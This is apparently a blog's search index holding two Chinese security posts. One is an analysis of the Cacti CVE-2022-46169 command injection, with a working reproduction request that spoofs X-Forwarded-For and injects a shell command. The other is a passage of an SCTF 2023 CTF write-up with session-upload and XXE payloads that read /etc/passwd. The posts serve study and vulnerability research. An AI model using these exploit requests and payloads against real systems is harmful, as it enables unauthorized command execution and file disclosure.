<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Cacti命令执行漏洞分析(CVE-2022-46169)</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/"/>
      <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/</url>
      
        <content type="html"><![CDATA[<h1 id="Cacti命令执行漏洞分析-CVE-2022-46169"><a href="#Cacti命令执行漏洞分析-CVE-2022-46169" class="headerlink" title="Cacti命令执行漏洞分析(CVE-2022-46169)"></a>Cacti命令执行漏洞分析(CVE-2022-46169)</h1><p>Assign: Penguin, 5x</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Cacti/cacti</span><br><span class="line">https://github.com/Cacti/cacti/releases/tag/release%2F1.2.22</span><br></pre></td></tr></table></figure><p><strong>影响版本</strong></p><p>Cacti &#x3D;&#x3D; 1.2.22</p><p><strong>漏洞修复</strong></p><p>Commit b43f13a</p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled.png" alt="Untitled"></p><h2 id="漏洞点定位"><a href="#漏洞点定位" class="headerlink" title="漏洞点定位"></a>漏洞点定位</h2><p><strong>lib&#x2F;functions.php</strong></p><p><strong>remote_agent.php</strong></p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%201.png" alt="Untitled"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本文的分析将从命令执行的点为起点，进行逆向的分析。</p><h3 id="命令执行的点"><a href="#命令执行的点" class="headerlink" title="命令执行的点"></a><strong>命令执行的点</strong></h3><p><strong>remote_agent.php的poll_for_data()函数</strong></p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%202.png" alt="Untitled"></p><ol><li>函数开始，首先获取了一些请求变量：<code>$local_data_ids</code>、<code>$host_id</code>和<code>$poller_id</code> ，其中<code>$poller_id</code>使用的是<code>get_nfilter_request_var()</code> 函数获取参数，即未对输入进行校验。</li><li>如果<code>$local_data_ids</code> 数组不为空，则进入<code>foreach</code>循环遍历<code>$local_data_ids</code>数组。在循环内部，首先调用了<code>input_validate_input_number()</code>函数对<code>$local_data_id</code>进行输入验证。</li><li>然后执行了一个数据库查询，根据<code>$host_id</code>和<code>$local_data_id</code>从<code>poller_item</code>表中获取相关记录，并将结果存储在<code>$items</code>变量中。</li><li>根据<code>$items</code> 中从<code>poller_item</code> 获取到的actions值来执行一个switch语句。</li><li><code>case POLLER_ACTION_SCRIPT_PHP</code> 如果action等于常量<strong>POLLER_ACTION_SCRIPT_PHP</strong>，即<strong>action&#x3D;2</strong>，则会执行下面的<code>proc_open</code> 函数，函数的参数将<code>$poller_id</code> 进行了拼接，因此使用管道符|或者&#96;&#96;即可进行命令执行</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$local_data_ids</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$local_data_ids</span> <span class="keyword">as</span> <span class="variable">$local_data_id</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">input_validate_input_number</span>(<span class="variable">$local_data_id</span>);</span><br><span class="line"><span class="variable">$items</span> = <span class="title function_ invoke__">db_fetch_assoc_prepared</span>(<span class="string">&#x27;SELECT *</span></span><br><span class="line"><span class="string">FROM poller_item</span></span><br><span class="line"><span class="string">WHERE host_id = ?</span></span><br><span class="line"><span class="string">AND local_data_id = ?&#x27;</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="variable">$host_id</span>, <span class="variable">$local_data_id</span>));</span><br><span class="line"><span class="variable">$script_server_calls</span> = <span class="title function_ invoke__">db_fetch_cell_prepared</span>(<span class="string">&#x27;SELECT COUNT(*)</span></span><br><span class="line"><span class="string">FROM poller_item</span></span><br><span class="line"><span class="string">WHERE host_id = ?</span></span><br><span class="line"><span class="string">AND local_data_id = ?</span></span><br><span class="line"><span class="string">AND action = 2&#x27;</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="variable">$host_id</span>, <span class="variable">$local_data_id</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$items</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$item</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> POLLER_ACTION_SNMP: <span class="comment">/* snmp */</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> POLLER_ACTION_SCRIPT: <span class="comment">/* script (popen) */</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> POLLER_ACTION_SCRIPT_PHP: <span class="comment">/* script (php script server) */</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$cactiphp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="title function_ invoke__">read_config_option</span>(<span class="string">&#x27;path_php_binary&#x27;</span>) . <span class="string">&#x27; -q &#x27;</span> . <span class="variable">$config</span>[<span class="string">&#x27;base_path&#x27;</span>] . <span class="string">&#x27;/script_server.php realtime &#x27;</span></span><br><span class="line">. <span class="variable">$poller_id</span>, <span class="variable">$cactides</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line"><span class="variable">$using_proc_function</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%203.png" alt="Untitled"></p><h3 id="绕过校验"><a href="#绕过校验" class="headerlink" title="绕过校验"></a>绕过校验</h3><p>现在向上分析，看看是谁调用的<strong>poll_for_data()函数</strong>，可以看到调用函数的位置</p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%204.png" alt="Untitled"></p><p>就是很简单的判断get传的action参数值，如果为polldata则调用<code>poll_for_data()</code> 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="title function_ invoke__">get_request_var</span>(<span class="string">&#x27;action&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;polldata&#x27;</span>:</span><br><span class="line"><span class="comment">// Only let realtime polling run for a short time</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="title function_ invoke__">read_config_option</span>(<span class="string">&#x27;script_timeout&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">debug</span>(<span class="string">&#x27;Start: Poling Data for Realtime&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">poll_for_data</span>();</span><br><span class="line"><span class="title function_ invoke__">debug</span>(<span class="string">&#x27;End: Poling Data for Realtime&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>可以看到remote_agent.php开头设置了校验，调用了<code>remote_client_authorized()</code> 函数，我们去看看此函数执行了什么操作</p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%205.png" alt="Untitled"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remote_client_authorized</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$poller_db_cnn_id</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* don&#x27;t allow to run from the command line */</span></span><br><span class="line"><span class="variable">$client_addr</span> = <span class="title function_ invoke__">get_client_addr</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$client_addr</span> === <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$client_addr</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line"><span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;ERROR: Invalid remote agent client IP Address.  Exiting&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_name</span> = <span class="title function_ invoke__">gethostbyaddr</span>(<span class="variable">$client_addr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$client_name</span> == <span class="variable">$client_addr</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">cacti_log</span>(<span class="string">&#x27;NOTE: Unable to resolve hostname from address &#x27;</span> . <span class="variable">$client_addr</span>, <span class="literal">false</span>, <span class="string">&#x27;WEBUI&#x27;</span>, POLLER_VERBOSITY_MEDIUM);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$client_name</span> = <span class="title function_ invoke__">remote_agent_strip_domain</span>(<span class="variable">$client_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pollers</span> = <span class="title function_ invoke__">db_fetch_assoc</span>(<span class="string">&#x27;SELECT * FROM poller&#x27;</span>, <span class="literal">true</span>, <span class="variable">$poller_db_cnn_id</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">cacti_sizeof</span>(<span class="variable">$pollers</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$pollers</span> <span class="keyword">as</span> <span class="variable">$poller</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">remote_agent_strip_domain</span>(<span class="variable">$poller</span>[<span class="string">&#x27;hostname&#x27;</span>]) == <span class="variable">$client_name</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$poller</span>[<span class="string">&#x27;hostname&#x27;</span>] == <span class="variable">$client_addr</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">cacti_log</span>(<span class="string">&quot;Unauthorized remote agent access attempt from <span class="subst">$client_name</span> (<span class="subst">$client_addr</span>)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>remote_client_authorized()</code> 函数实现的功能为：</p><ol><li>执行<code>get_client_addr()</code>函数，获取客户端地址并将其赋值给<code>$client_addr</code>变量。</li><li>然后对<code>$client_addr</code> 进行一系列的校验</li><li>调用<code>remote_agent_strip_domain($client_name)</code>函数剥离主机名的域名部分，并将结果赋值给<code>$client_name</code>变量。</li><li>执行数据库查询，从<code>poller</code>表中获取所有记录，并将结果存储在<code>$pollers</code>数组中。</li><li>如果<code>$poller</code> 不为空，则循环遍历<code>$pollers</code>数组，对比远程客户端的主机名和地址与<code>$poller</code>记录中的主机名进行比较，如果剥离域名后的<code>$polle</code> 和<code>$client_name</code> 相同则返回<code>true</code>表示授权。</li></ol><p>在数据库中$poller[‘hostname’]默认为localhost，所以只要传入内网地址即可绕过校验。</p><p>那么我们如何传入内网地址呢，函数中使用的是<code>get_client_addr()</code> ，我们再看一下这个函数的功能</p><p><strong>lib&#x2F;functions.php</strong></p><p>get_client_addr()</p><p>循环遍历<code>$http_addr_headers</code>数组中的每个请求头</p><p>在这段代码中，使用<code>break 2</code>语句可以提前跳出两层循环，导致在匹配到<code>X-Forwarded-For</code>请求头时就停止了循环，并将<code>$client_addr</code>设置为该请求头的值。</p><blockquote><p>开发者的本意应该是下面的做法：<br>        1、删除<code>break 2</code>语句，使循环遍历完所有的请求头，并验证每个请求头中的IP地址。<br>        2、在循环结束后，如果没有找到有效的客户端地址，可以使用<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>作为默认值<br>这样做的目的是确保使用最可靠的<code>REMOTE_ADDR</code>作为客户端地址，避免使用伪造的请求头。</p></blockquote><p>因为开发者错误的写法，攻击者可以发送带有伪造<code>X-Forwarded-For</code>请求头的请求，从而传入内网地址，绕过<code>remote_client_authorized()</code> 函数的限制。</p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%206.png" alt="Untitled"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，整个命令执行的流程已经基本逆向地分析完成，再正向的梳理一遍</p><ul><li>漏洞点位于<code>remote_agent.php</code>中，且无需身份验证即可访问此文件。</li><li>因此我们访问<code>remote_agent.php</code> 且<code>X-Forwarded-For</code>请求头伪造为内网地址</li><li>get传action参数值，值为polldata，进入<code>poll_for_data()</code> 函数</li><li>真实情况下，<strong>local_data_id、host_id需要爆破</strong>，以令<strong>action&#x3D;2</strong>从而进入执行<code>proc_open</code> 函数的case</li><li><code>proc_open</code> 函数处将<code>$poller_id</code> 参数进行了拼接，因此使用管道符|或者&#96;&#96;即可进行命令执行</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /remote_agent.<span class="property">php</span>?action=polldata&amp;local_data_ids[<span class="number">0</span>]=<span class="number">6</span>&amp;host_id=<span class="number">1</span>&amp;poller_id=<span class="string">`id%3E/tmp/1`</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="attr">xxxx</span>:<span class="number">8080</span></span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: <span class="title class_">Mozilla</span>/<span class="number">5.0</span> (<span class="title class_">Macintosh</span>; <span class="title class_">Intel</span> <span class="title class_">Mac</span> <span class="variable constant_">OS</span> X <span class="number">10.15</span>; <span class="attr">rv</span>:<span class="number">109.0</span>) <span class="title class_">Gecko</span>/<span class="number">20100101</span> <span class="title class_">Firefox</span>/<span class="number">115.0</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=e908ctre124lr4raadulh4sib2; Cacti=8f7517d771b4fd1267e74fbdfef91e9c; CactiDateTime=Wed Jul 12 2023 14:38:05 GMT+0800 (ä¸­å½æ åæ¶é´); CactiTimeZone=480</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">X-Originating-IP: 127.0.0.1</span></span><br><span class="line"><span class="comment">X-Remote-IP: 127.0.0.1</span></span><br><span class="line"><span class="comment">X-Remote-Addr: 127.0.0.1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br></pre></td></tr></table></figure><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%207.png" alt="Untitled"></p><p><img src="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Cacti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2022-46169)/Untitled%208.png" alt="Untitled"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023SCTF-pypyp?</title>
      <link href="/Writeup/WEB/2023SCTF-pypyp/"/>
      <url>/Writeup/WEB/2023SCTF-pypyp/</url>
      
        <content type="html"><![CDATA[<h1 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h1><blockquote><h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><p>a piece of cake but hard work。per 5 min restart.<br> pay attention to <code>/app/app.py</code>​</p></blockquote><h2 id="start-session"><a href="#start-session" class="headerlink" title="start_session"></a>start_session</h2><p>　　​<code>Session not started</code>​，那么利用<strong>​ PHP_SESSION_UPLOAD_PROGRESS</strong> 上传 <strong>Session</strong></p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230708222543-x99vxb7.png" alt="image">​</p><blockquote><p>关于 <strong>PHP_SESSION_UPLOAD_PROGRESS ​</strong>可以参考这篇文章 <a href="https://xz.aliyun.com/t/9545" title="浅谈 SESSION_UPLOAD_PROGRESS 的利用">浅谈 SESSION_UPLOAD_PROGRESS 的利用</a></p><p><img src="/Writeup/WEB/2023SCTF-pypyp/image-20230708221204-u99wzts.png" alt="image">​</p></blockquote><p>　　根据这篇文章的分析<br>我们直接使用<code>curl</code>​指定cookie头<code>PHPSESSID</code>​和POST的恶意字段<code>PHP_SESSION_UPLOAD_PROGRESS</code>​，然后设置代理用yakit抓包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=5x&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=5x&#x27; -x http://172.22.240.1:8084</span><br></pre></td></tr></table></figure><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230708222729-mxom4ia.png" alt="image">返回的是高亮后的源码，右上角使用浏览器打开</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230708222803-jp4ccvb.png" alt="image"></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>　　审计一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span> &lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>　　​<code>extract(unserialize($_POST[&#39;data&#39;]));</code>​：将<code>$_POST[&#39;data&#39;]</code>​进行反序列化后，通过<code>extract</code>​函数将其内容解压到当前符号表中。</p><p>　　​<code>$object -&gt; sctf();</code>​：可以触发<code>__call</code>​方法</p><p>　　​<code>new $type($properties[0],$properties[1])</code>​：使用动态类名创建对象。导致类注入漏洞，允许攻击者创建任意类的对象。</p><p>　　​<code>file_get_contents(&#39;http://127.0.0.1:5000/&#39;.$properties);</code>​：使用输入的<code>$properties</code>​构造URL，并通过<code>file_get_contents</code>​函数获取远程内容。</p><p>　　那么思路就是，通过<code>extract</code>​进行变量覆盖，控制<code>$type</code>​和<code>$properties</code>​的值为<code>SimpleXMLElement</code>​和xxe的payload<br>以利用实例化该类的对象来传入xml代码进行xxe攻击，进而读取文件内容和命令执行。</p><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><blockquote><p>参考：<a href="https://www.extrader.top/posts/35c0085d/#SimpleXMLElement">https://www.extrader.top/posts/35c0085d/#SimpleXMLElement</a></p><p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code>​</p><p>利用实例化该类的对象来传入xml代码进行xxe攻击，进而读取文件内容和命令执行。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;f;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$xml_class</span> = <span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="variable">$xml</span>, LIBXML_NOENT);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$xml_class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>　　构造数组并序列化后传入​<code>data</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$type</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$properties_xml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;a&gt;&amp;f;&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$properties_xml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$type</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><p>　　​<img 